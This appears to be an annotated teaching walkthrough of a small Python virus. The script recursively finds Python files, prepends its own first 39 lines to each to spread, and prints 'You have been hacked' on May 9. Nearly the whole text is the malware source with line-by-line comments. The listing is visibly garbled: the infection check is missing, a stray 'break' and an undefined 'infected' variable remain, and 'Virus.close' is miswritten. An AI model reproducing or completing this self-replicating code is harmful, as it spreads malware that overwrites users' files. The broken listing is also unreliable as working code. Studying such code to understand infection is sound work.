#!/usr/bin/python3

-Shebang line specifies an interpreter is to be used in python3.

import os
import datetime

-Both of these lines import the necessary modules for the “os” and “date/time”

SIGNATURE = "VIRUS"

-This defines a variable SIGNATURE  with the vale VIRUS

def locate(path):
    files_targeted = []   -Initialize a empty list of files to be targeted
    filelist = os.listdir(path)   -Get a list of files in current directory
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))   -Recursive call for subdirectories

                    break
            if infected == False:
-Check if file is infected 

                files_targeted.append(path+"/"+fname)  - Add uninfected files to the list
    return files_targeted

-This function scans for virus-free Python files in a directory and its subfolders, adding clean files to a list.



def infect(files_targeted):
-This function infects files by prepending the code

    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    Virus.close
-Read the first 39 lines of the code and store it

    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()
- Prepend the code to trigger each file

-This function acts as a virus propagation tool. It reads the first 39 lines of the current script as the virus payload, then loops through a list of victim files, injecting the payload at the beginning of each file, effectively compromising their functionality.


def detonate():
-This function contains a payload that triggers on the date
   
 if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")
-If it is May 9th print the associated message

-This function verifies whether a certain date (May 9th) has arrived. If it has, it delivers a pre-determined message ("You have been hacked").


files_targeted = locate(os.path.abspath(""))
-Locate Python files in directory and subdirectory
infect(files_targeted)
-Infect the located files

detonate()
-Checks if the payload should be triggered and prints a message if the condition is met.

-This script automates a series of actions: identifying Python files, modifying their content, and triggering a specific function based on a predefined condition.
